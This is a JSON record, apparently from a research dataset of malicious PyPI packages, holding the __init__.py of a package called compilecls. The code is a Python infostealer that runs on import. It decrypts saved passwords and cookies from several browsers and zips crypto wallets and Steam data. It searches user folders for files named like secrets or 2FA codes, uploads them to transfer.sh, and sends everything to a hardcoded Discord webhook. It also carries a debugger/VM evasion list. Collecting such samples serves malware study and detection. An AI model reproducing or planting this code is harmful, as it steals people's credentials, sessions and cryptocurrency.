[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/compilecls-1.0.2-py3-none-any/compilecls/__init__.py",
    "malicious_code": "import os\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport httpx\nimport psutil\nimport base64\nimport requests\nimport ctypes\nimport time\nimport pyperclip\nimport win32gui\nimport win32con\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\nlocal = os.getenv(\"LOCALAPPDATA\")\nroaming = os.getenv(\"APPDATA\")\ntemp = os.getenv(\"TEMP\")\nNotPSSW = []\n\n__config__ = {\n    \"yourwebhookurl\": \"https://discordapp.com/api/webhooks/1094671563900592279/_cSChOjEJs9TL7F1Kugq6WvyOKIKN1_qV3kRqXOeZ_F-OaXj7X7HFj86zihjv1RInLqJ\",\n    \"bc_injection_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js\",\n    \"hide\": \"yes\",\n    \"ping\": \"yes\",\n    \"pingtype\": \"everyone\",\n    \"fake_error\": \"no\",\n    \"startup\": \"no\",\n    \"kill_discord_process\": \"%kill_discord_process%\",\n    \"dbugkiller\": \"%_debugkiller%\",\n    \"addresse_crypto_replacer\": \"no\",\n    \"addresse_btc\": \"none\",\n    \"addresse_eth\": \"none\",\n    \"addresse_xchain\": \"none\",\n    \"addresse_pchain\": \"none\",\n    \"addresse_cchain\": \"none\",\n    \"addresse_monero\": \"none\",\n    \"addresse_ada\": \"none\",\n    \"addresse_dash\": \"none\",\n    \"blprggg\": [\n        \"httpdebuggerui\",\n        \"wireshark\",\n        \"fiddler\",\n        \"regedit\",\n        \"cmd\",\n        \"taskmgr\",\n        \"vboxservice\",\n        \"df5serv\",\n        \"processhacker\",\n        \"vboxtray\",\n        \"vmtoolsd\",\n        \"vmwaretray\",\n        \"ida64\",\n        \"ollydbg\",\n        \"pestudio\",\n        \"vmwareuser\",\n        \"vgauthservice\",\n        \"vmacthlp\",\n        \"x96dbg\",\n        \"vmsrvc\",\n        \"x32dbg\",\n        \"vmusrvc\",\n        \"prl_cc\",\n        \"prl_tools\",\n        \"xenservice\",\n        \"qemu-ga\",\n        \"joeboxcontrol\",\n        \"ksdumperclient\",\n        \"ksdumper\",\n        \"joeboxserver\",\n    ],\n}\n\nlogin_info = os.getlogin()\ncomputer_victim = os.getenv(\"COMPUTERNAME\")\nfast_memory_storage = str(psutil.virtual_memory()[0] / 1024**3).split(\".\")[0]\nstorage_space = str(psutil.disk_usage(\"/\")[0] / 1024**3).split(\".\")[0]\n\nbc_myregex_secret = \"https://paste.bingner.com/paste/u7qoj/raw\"\nreg_req = requests.get(bc_myregex_secret)\nregx_net = r\"[\\w-]{24}\\.\" + reg_req.text\n\n# ...\n# (Omitted: The full class definitions for Functions, auto_copy_wallet, first_function_bc, NoDebugg)\n# ...\n\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(first_function_bc().init())\nlocal = os.getenv(\"LOCALAPPDATA\")\nroaming = os.getenv(\"APPDATA\")\ntemp = os.getenv(\"TEMP\")\nThreadlist = []\n\ndef find_in_config(e: str) -> str or bool | None:\n    return __config__.get(e)\n\nhook = find_in_config(\"yourwebhookurl\")\n\nclass DATA_BLOB(Structure):\n    _fields_ = [(\"cbData\", wintypes.DWORD), (\"pbData\", POINTER(c_char))]\n\ndef GetData(blob_out):\n    cbData = int(blob_out.cbData)\n    pbData = blob_out.pbData\n    buffer = c_buffer(cbData)\n    cdll.msvcrt.memcpy(buffer, pbData, cbData)\n    windll.kernel32.LocalFree(pbData)\n    return buffer.raw\n\ndef CryptUnprotectData(encrypted_bytes, entropy=b\"\"):\n    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))\n    buffer_entropy = c_buffer(entropy, len(entropy))\n    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)\n    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)\n    blob_out = DATA_BLOB()\n\n    if windll.crypt32.CryptUnprotectData(\n        byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)\n    ):\n        return GetData(blob_out)\n\ndef Value_Dcryptage(buff, master_key=None):\n    starts = buff.decode(encoding=\"utf8\", errors=\"ignore\")[:3]\n    if starts == \"v10\" or starts == \"v11\":\n        iv = buff[3:15]\n        payload = buff[15:]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-16].decode()\n        return decrypted_pass\n\ndef Requests_loading(methode, url, data=\"\", files=\"\", headers=\"\"):\n    for i in range(8):\n        try:\n            if methode == \"POST\":\n                if data != \"\":\n                    r = requests.post(url, data=data)\n                    if r.status_code == 200:\n                        return r\n                elif files != \"\":\n                    r = requests.post(url, files=files)\n                    if (\n                        r.status_code == 200 or r.status_code == 413\n                    ):  # 413 = DATA TO BIG\n                        return r\n        except:\n            pass\n\ndef URL_librairy_Loading(hook, data=\"\", files=\"\", headers=\"\"):\n    for i in range(8):\n        try:\n            if headers != \"\":\n                r = urlopen(Request(hook, data=data, headers=headers))\n                return r\n            else:\n                r = urlopen(Request(hook, data=data))\n                return r\n        except:\n            pass\n\ndef Trust(Cookies):\n    global DETECTED\n    data = str(Cookies)\n    tim = re.findall(\".google.com\", data)\n    if len(tim) < -1:\n        DETECTED = True\n        return DETECTED\n    else:\n        DETECTED = False\n        return DETECTED\n\ndef Reformat(listt):\n    e = re.findall(\"(\\w+[a-z])\", listt)\n    while \"https\" in e:\n        e.remove(\"https\")\n    while \"com\" in e:\n        e.remove(\"com\")\n    while \"net\" in e:\n        e.remove(\"net\")\n    return list(set(e))\n\ndef upload(name, tk=\"\"):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\",\n    }\n\n    if name == \"check_spec_bc\":\n        data = {\n            \"content\": \"\",\n            \"embeds\": [\n                {\n                    \"fields\": [\n                        {\"name\": \"Interesting files found on user PC:\", \"value\": tk}\n                    ],\n                    \"author\": {\n                        \"name\": f\"Black - Cap v2.3\",\n                        \"url\": \"https://github.com/KSCHdsc\",\n                        \"icon_url\": \"https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif\",\n                    },\n                    \"footer\": {\"text\": \"github.com/KSCHdsc\"},\n                    \"color\": 374276,\n                }\n            ],\n            \"avatar_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png\",\n            \"attachments\": [],\n        }\n        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)\n        return\n    path = name\n    files = {\"file\": open(path, \"rb\")}\n\n    if \"bc_allpasswords\" in name:\n        ra = \" | \".join(da for da in paswWords)\n\n        if len(ra) > 1000:\n            rrr = Reformat(str(paswWords))\n            ra = \" | \".join(da for da in rrr)\n        data = {\n            \"content\": \"\",\n            \"embeds\": [\n                {\n                    \"fields\": [{\"name\": \"Passwords Found:\", \"value\": ra}],\n                    \"author\": {\n                        \"name\": f\"Black - Cap v2.3\",\n                        \"url\": \"https://github.com/KSCHdsc\",\n                        \"icon_url\": \"https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif\",\n                    },\n                    \"footer\": {\n                        \"text\": \"github.com/KSCHdsc\",\n                    },\n                    \"color\": 374276,\n                }\n            ],\n            \"avatar_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png\",\n            \"attachments\": [],\n        }\n        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)\n    if \"bc_allcookies\" in name:\n        rb = \" | \".join(da for da in cookiWords)\n        if len(rb) > 1000:\n            rrrrr = Reformat(str(cookiWords))\n            rb = \" | \".join(da for da in rrrrr)\n        data = {\n            \"content\": \"\",\n            \"embeds\": [\n                {\n                    \"fields\": [{\"name\": \"Cookies Found:\", \"value\": rb}],\n                    \"author\": {\n                        \"name\": f\"Black - Cap v2.3\",\n                        \"url\": \"https://github.com/KSCHdsc\",\n                        \"icon_url\": \"https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/blackcap.gif\",\n                    },\n                    \"footer\": {\n                        \"text\": \"github.com/KSCHdsc\",\n                    },\n                    \"color\": 374276,\n                }\n            ],\n            \"avatar_url\": \"https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png\",\n            \"attachments\": [],\n        }\n        URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)\n    Requests_loading(\"POST\", hook, files=files)\n\ndef writeforfile(data, name):\n    path = os.getenv(\"TEMP\") + f\"\\{name}.txt\"\n    with open(path, mode=\"w\", encoding=\"utf-8\") as f:\n        f.write(f\"Created by KSCH | https://github.com/KSCHdsc\\n\\n\")\n        for line in data:\n            if line[0] != \"\":\n                f.write(f\"{line}\\n\")\n\nNotPSSW = []\n\ndef Find_Passw(path, arg):\n    global NotPSSW\n    if not os.path.exists(path):\n        return\n    pathC = path + arg + \"/Login Data\"\n    if os.stat(pathC).st_size == 0:\n        return\n    tempfold = (\n        temp\n        + \"bc_is_here\"\n        + \"\".join(random.choice(\"bcdefghijklmnopqrstuvwxyz\") for i in range(8))\n        + \".db\"\n    )\n    shutil.copy2(pathC, tempfold)\n    conn = connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n\n    pathKey = path + \"/Local State\"\n    with open(pathKey, \"r\", encoding=\"utf-8\") as f:\n        local_state = loads(f.read())\n    master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n    master_key = CryptUnprotectData(master_key[5:])\n\n    for row in data:\n        if row[0] != \"\":\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split(\"[\")[1].split(\"]\")[0]\n                if wa in row[0]:\n                    if not old in paswWords:\n                        paswWords.append(old)\n            NotPSSW.append(\n                f\"URL: {row[0]} \\n ID: {row[1]} \\n PASSW0RD: {Value_Dcryptage(row[2], master_key)}\\n\\n\"\n            )\n    writeforfile(NotPSSW, \"bc_allpasswords\")\n\nCookies = []\n\ndef Get_Bc_Cook(path, arg):\n    global Cookies\n    if not os.path.exists(path):\n        return\n    pathC = path + arg + \"/Cookies\"\n    if os.stat(pathC).st_size == 0:\n        return\n    tempfold = (\n        temp\n        + \"bc_is_here\"\n        + \"\".join(random.choice(\"bcdefghijklmnopqrstuvwxyz\") for i in range(8))\n        + \".db\"\n    )\n\n    shutil.copy2(pathC, tempfold)\n    conn = connect(tempfold)\n    cursor = conn.cursor()\n    cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n    data = cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n\n    pathKey = path + \"/Local State\"\n\n    with open(pathKey, \"r\", encoding=\"utf-8\") as f:\n        local_state = loads(f.read())\n    master_key = b64decode(local_state[\"os_crypt\"][\"encrypted_key\"])\n    master_key = CryptUnprotectData(master_key[5:])\n\n    for row in data:\n        if row[0] != \"\":\n            for wa in keyword:\n                old = wa\n                if \"https\" in wa:\n                    tmp = wa\n                    wa = tmp.split(\"[\")[1].split(\"]\")[0]\n                if wa in row[0]:\n                    if not old in cookiWords:\n                        cookiWords.append(old)\n            Cookies.append(\n                f\"{row[0]}\\tTRUE\"\n                + \"\\t\\t\"\n                + f\"/FALSE\\t2597573456\\t{row[1]}\\t{Value_Dcryptage(row[2], master_key)}\"\n            )\n    writeforfile(Cookies, \"bc_allcookies\")\n\ndef checkIfProcessRunning(processName):\n    \"\"\"\n    Check if there is any running process that contains the given name processName.\n    \"\"\"\n    # Iterate over the all the running process\n    for proc in psutil.process_iter():\n        try:\n            # Check if process name contains the given name string.\n            if processName.lower() in proc.name().lower():\n                return True\n        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):\n            pass\n    return False\n\ndef ZipMyThings(path, arg, procc):\n    pathC = path\n    name = arg\n    if \"aholpfdialjgjfhomihkjbmgjidlcdno\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(\" \", \"\")\n        name = f\"Exodus_{browser}\"\n        pathC = path + arg\n    if \"nkbihfbeogaeaoehlefnkodbefgpgknn\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(\" \", \"\")\n        name = f\"Metamask_{browser}\"\n        pathC = path + arg\n    if not os.path.exists(pathC):\n        return\n    if checkIfProcessRunning(\"chrome.exe\"):\n        print(\"Yes a chrome process was running\")\n        subprocess.Popen(f\"taskkill /im {procc} /t /f\", shell=True)\n    else:\n        ...\n    if \"Wallet\" in arg or \"NationsGlory\" in arg:\n        browser = path.split(\"\\\\\")[4].split(\"/\")[1].replace(\" \", \"\")\n        name = f\"{browser}\"\n    elif \"Steam\" in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"):\n            return\n        f = open(f\"{pathC}/loginusers.vdf\", \"r+\", encoding=\"utf8\")\n        data = f.readlines()\n        found = False\n        for l in data:\n            if 'RememberPassword\"\\t\\t\"1\"' in l:\n                found = True\n        if found == False:\n            return\n        name = arg\n    zf = zipfile.ZipFile(f\"{pathC}/{name}.zip\", \"w\")\n    print(zf)\n    for file in os.listdir(pathC):\n        if not \".zip\" in file:\n            zf.write(pathC + \"/\" + file)\n    zf.close()\n\n    upload(f\"{pathC}/{name}.zip\")\n    os.remove(f\"{pathC}/{name}.zip\")\n\ndef bc_Gather_All():\n    \"Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >\"\n    browserPaths = [\n        [\n            f\"{roaming}/Opera Software/Opera GX Stable\",\n            \"opera.exe\",\n            \"/Local Storage/leveldb\",\n            \"/\",\n            \"/Network\",\n            \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{roaming}/Opera Software/Opera Stable\",\n            \"opera.exe\",\n            \"/Local Storage/leveldb\",\n            \"/\",\n            \"/Network\",\n            \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",\n            \"opera.exe\",\n            \"/Local Storage/leveldb\",\n            \"/\",\n            \"/Network\",\n            \"/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/Google/Chrome/User Data\",\n            \"chrome.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/Google/Chrome SxS/User Data\",\n            \"chrome.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/BraveSoftware/Brave-Browser/User Data\",\n            \"brave.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/Yandex/YandexBrowser/User Data\",\n            \"yandex.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n        [\n            f\"{local}/Microsoft/Edge/User Data\",\n            \"edge.exe\",\n            \"/Default/Local Storage/leveldb\",\n            \"/Default\",\n            \"/Default/Network\",\n            \"/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn\",\n        ],\n    ]\n\n    Paths_zipped = [\n        [f\"{roaming}/atomic/Local Storage/leveldb\", '\"Atomic Wallet.exe\"', \"Wallet\"],\n        [f\"{roaming}/Exodus/exodus.wallet\", \"Exodus.exe\", \"Wallet\"],\n        [\"C:\\Program Files (x86)\\Steam\\config\", \"steam.exe\", \"Steam\"],\n        [\n            f\"{roaming}/NationsGlory/Local Storage/leveldb\",\n            \"NationsGlory.exe\",\n            \"NationsGlory\",\n        ],\n    ]\n\n    for patt in browserPaths:\n        a = threading.Thread(target=Find_Passw, args=[patt[0], patt[3]])\n        a.start()\n        Threadlist.append(a)\n    thread_bccookies = []\n    for patt in browserPaths:\n        a = threading.Thread(target=Get_Bc_Cook, args=[patt[0], patt[4]])\n        a.start()\n        thread_bccookies.append(a)\n    for thread in thread_bccookies:\n        thread.join()\n    DETECTED = Trust(Cookies)\n    if DETECTED == True:\n        return\n    for patt in browserPaths:\n        threading.Thread(target=ZipMyThings, args=[patt[0], patt[5], patt[1]]).start()\n    for patt in Paths_zipped:\n        threading.Thread(target=ZipMyThings, args=[patt[0], patt[2], patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths\n    upths = []\n\n    for file in [\"bc_allpasswords.txt\", \"bc_allcookies.txt\"]:\n        upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\n\ndef UploadTo_Anon(path):\n    try:\n        files = {\"file\": (path, open(path, mode=\"rb\"))}\n        ...\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef CreateFolder_(pathF, keywords):\n    global bc_create_files\n    maxfilesperdir = 7\n    i = 0\n    listOfFile = os.listdir(pathF)\n    ffound = []\n    for file in listOfFile:\n        if not os.path.isfile(pathF + \"/\" + file):\n            return\n        i += 1\n        if i <= maxfilesperdir:\n            url = UploadTo_Anon(pathF + \"/\" + file)\n            ffound.append([pathF + \"/\" + file, url])\n        else:\n            break\n    bc_create_files.append([\"folder\", pathF + \"/\", ffound])\n\nbc_create_files = []\n\ndef bc_create_file(path, keywords):\n    global bc_create_files\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append(\n                        [path + \"/\" + file, UploadTo_Anon(path + \"/\" + file)]\n                    )\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    CreateFolder_(target, keywords)\n                    break\n    bc_create_files.append([\"folder\", path, fifound])\n\ndef check_spec_bc():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [user + \"/Desktop\", user + \"/Downloads\", user + \"/Documents\"]\n\n    key_wordsFiles = [\n        \"passw\",\n        \"mdp\",\n        \"motdepasse\",\n        \"mot_de_passe\",\n        \"login\",\n        \"secret\",\n        \"account\",\n        \"acount\",\n        \"paypal\",\n        \"banque\",\n        \"metamask\",\n        \"wallet\",\n        \"crypto\",\n        \"exodus\",\n        \"discord\",\n        \"2fa\",\n        \"code\",\n        \"memo\",\n        \"compte\",\n        \"token\",\n        \"backup\",\n        \"seecret\",\n    ]\n\n    wikith = []\n    for patt in path2search:\n        check_spec_bc = threading.Thread(\n            target=bc_create_file, args=[patt, key_wordsFiles]\n        )\n        check_spec_bc.start()\n        wikith.append(check_spec_bc)\n    return wikith\n\nglobal keyword, cookiWords, paswWords\n\nkeyword = [\n    \"mail\",\n    \"[coinbase](https://coinbase.com)\",\n    \"[sellix](https://sellix.io)\",\n    \"[gmail](https://gmail.com)\",\n    \"[steam](https://steam.com)\",\n    \"[discord](https://discord.com)\",\n    \"[riotgames](https://riotgames.com)\",\n    \"[youtube](https://youtube.com)\",\n    \"[instagram](https://instagram.com)\",\n    \"[tiktok](https://tiktok.com)\",\n    \"[twitter](https://twitter.com)\",\n    \"[facebook](https://facebook.com)\",\n    \"card\",\n    \"[epicgames](https://epicgames.com)\",\n    \"[spotify](https://spotify.com)\",\n    \"[yahoo](https://yahoo.com)\",\n    \"[roblox](https://roblox.com)\",\n    \"[twitch](https://twitch.com)\",\n    \"[minecraft](https://minecraft.net)\",\n    \"bank\",\n    \"[paypal](https://paypal.com)\",\n    \"[origin](https://origin.com)\",\n    \"[amazon](https://amazon.com)\",\n    \"[ebay](https://ebay.com)\",\n    \"[aliexpress](https://aliexpress.com)\",\n    \"[playstation](https://playstation.com)\",\n    \"[hbo](https://hbo.com)\",\n    \"[xbox](https://xbox.com)\",\n    \"buy\",\n    \"sell\",\n    \"[binance](https://binance.com)\",\n    \"[hotmail](https://hotmail.com)\",\n    \"[outlook](https://outlook.com)\",\n    \"[crunchyroll](https://crunchyroll.com)\",\n    \"[telegram](https://telegram.com)\",\n    \"[pornhub](https://pornhub.com)\",\n    \"[disney](https://disney.com)\",\n    \"[expressvpn](https://expressvpn.com)\",\n    \"crypto\",\n    \"[uber](https://uber.com)\",\n    \"[netflix](https://netflix.com)\",\n]\n\ncookiWords = []\npaswWords = []\n\nbc_Gather_All()\nDETECTED = Trust(Cookies)\n\nif not DETECTED:\n    wikith = check_spec_bc()\n\n    for thread in wikith:\n        thread.join()\n    time.sleep(0.2)\n\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext += f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a) - 1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n\n    upload(\"check_spec_bc\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n"
  }
]